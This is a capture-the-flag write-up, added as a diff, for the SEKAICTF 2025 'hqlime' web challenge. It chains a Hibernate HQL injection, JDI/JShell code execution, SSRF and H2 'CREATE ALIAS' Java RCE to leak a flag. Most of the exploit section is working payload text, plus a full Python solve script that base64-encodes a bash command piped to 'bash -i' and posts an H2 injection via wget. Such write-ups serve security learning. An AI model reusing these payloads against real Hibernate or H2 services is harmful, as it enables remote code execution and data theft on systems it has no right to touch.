@@ -1,0 +1,169 @@
+---
+title: hqlime
+description: 'Status: Done'
+date: 2026-01-03
+tags:
+  - HQLi
+  - JDI
+  - RCE
+category: web
+ctf_event: SEKAICTF 2025
+draft: false
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Status: Done
+
+## Summary
+
+Exposed `order_service` (port 1337) had an **HQL injection** in `fields` for `/orders`. Using Hibernate **constructor expressions** we instantiated `jdk.jshell.execution.JdiInitiator` to spawn helper JVMs and execute arbitrary commands. We SSRF’d the internal `authn_service:8000` and abused its H2-backed **HQLi** to run Java via `CREATE ALIAS`, finally leaking the flag.
+
+<Callout type="note" title="Note">
+🔥
+
+Chain: HQLi (order) → JDI Launch → jlink writes JShell script → JShell executes → SSRF to auth → H2 SQL/Java RCE → flag exfil
+
+</Callout>
+
+## Description
+
+- `order_service`:
+  - Route: `POST /orders` with `sessionId`, `fields`.
+  - Query built as: `select %s from Order o where o.username="%s"`.
+  - `validateFields()` only checks `Pattern.matches("\\W", token)`, so tokens like `new jdk.jshell...` pass.
+  - Hibernate allows `select new fqcn(arg,...)` → **arbitrary object construction with side effects**.
+- `authn_service`:
+  - Exposes `/login` and `/sessionInfo` (internal only).
+  - HQL built via string formatting and uses **H2** → supports `CSVWRITE` and `CREATE ALIAS ... AS 'java ...'`.
+
+## Analyst
+
+- Category: **Web** (ORM/HQLi + SSRF), with **JVM gadgeting** via JShell/JDI.
+- Core bug #1: HQL injection in `fields` (no parameter binding).
+- Core bug #2: Internal H2 HQLi enabling `CSVWRITE`/`CREATE ALIAS` (Java exec).
+
+## Exploit
+
+1. **Get session on order_service**
+
+```bash
+SID=$(curl -s -X POST http://HOST:1337/login -d 'username=guest&password=guest')
+
+```
+
+1. **Phase A (JDI → jlink writes JShell script)**
+
+```
+fields=new jdk.jshell.execution.JdiInitiator(
+0,new java.util.ArrayList(cast(count(o.id) as integer)),
+'jdk/tools/jlink/internal/Main --save-opts /tmp/lol',
+true,'localhost',10000,
+new map('jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p "\nRuntime.getRuntime().exec(new String(new byte[]{<BYTES>}));" --save-opts /tmp/lol' as main))
+
+```
+
+`<BYTES>` encodes a shell command (e.g., `wget …` or the SSRF POST) as comma-separated byte values.
+
+1. **Phase B (JDI → run JShell script)**
+
+```
+fields=new jdk.jshell.execution.JdiInitiator(
+0,new java.util.ArrayList(cast(count(o.id) as integer)),
+'jdk/internal/jshell/tool/JShellToolProvider /tmp/lol',
+true,'localhost',10000,new map())
+
+```
+
+1. **SSRF into auth_service with H2 RCE payload**
+
+- Command executed by JShell: POST to `http://127.0.0.1:8000/login` with `password` built to inject H2:
+  - Use `CSVWRITE` + `CREATE ALIAS SHELLEXEC AS 'java …'`.
+  - In alias body, `new ProcessBuilder("/flag").start().getInputStream().readAllBytes()`; store output by creating a `User` whose `username` contains the flag and `Session(sessId='a')`.
+
+1. **Read the flag via order_service**
+
+```bash
+# trigger rendering where username contains flag and a dangling quote reveals it
+curl -s -X POST http://HOST:1337/orders \
+  --data "sessionId=a&fields=1||'"
+
+```
+
+## Result
+
+- Successfully launched helper JVMs from HQL via `JdiInitiator`.
+- Performed SSRF to `authn_service`, executed H2 Java alias, and **exfiltrated the flag** through the `orders` response.
+- Example: `SEKAI{...actual_flag...}` printed in the HTTP body/logs.
+
+**Lessons:** Always use parameterized queries in ORM (no string interpolation), disable dangerous H2 features in prod, and block intra-service SSRF (network policy).
+
+Writeup authors
+
+```python
+import base64
+import requests
+
+base_url = "http://localhost:1337"
+
+leak_sess_id = "a"
+cmd = "/flag"
+
+sess = requests.Session()
+
+sessionId = sess.post(
+    f"{base_url}/login", data={"username": "guest", "password": "guest"}
+)
+
+p = """
+\\" and function('CSVWRITE','/tmp/kek','select 1;CREATE ALIAS SHELLEXEC AS ''void leak(String sessId, String cmd) throws java.lang.Exception {sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]{39, 124, 124, 34})), cmd)), sessId));}//''; CALL SHELLEXEC(''%s'', ''%s'')','charset=UTF-8')=\\"
+""".replace(
+    "\n", ""
+) % (
+    leak_sess_id,
+    cmd,
+)
+
+cmd = f"""
+wget --header='Content-Type: application/x-www-form-urlencoded' --post-data "username=u&password={p}" http://127.0.0.1:8000/login
+""".strip()
+
+cmd = (
+    "/bin/bash -c {echo,"
+    + base64.b64encode(cmd.encode()).decode()
+    + "}|{base64,-d}|{bash,-i}"
+)
+
+constr_bytes = "/**/,".join(
+    ",".join(str(ord(c)) for c in cmd[i : i + 60]) for i in range(0, len(cmd), 60)
+)
+
+java_code = (
+    """
+Runtime.getRuntime().exec(new String(new byte[]{%s}));
+"""
+    % constr_bytes
+)
+
+col = f'new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), "jdk/tools/jlink/internal/Main --save-opts /tmp/vincent", true, "localhost", 3000000, new map("jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \\"\\n{java_code}\\" --save-opts /tmp/vincent" as main, "n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads))'
+
+col = f"{col} union select {col} "
+
+def order(sessionId, fields):
+    return sess.post(
+        f"{base_url}/orders",
+        data={"sessionId": sessionId, "fields": fields},
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+
+# order(sessionId=sessionId, fields=col)
+
+col = f'new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), "jdk/internal/jshell/tool/JShellToolProvider /tmp/vincent", true, "localhost", 3000000, new map("n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads))'
+
+col = f"{col} union select {col} "
+
+print(order(sessionId=sessionId, fields=col))
+
+print(order(sessionId=leak_sess_id, fields="1||'").text)
+
+```
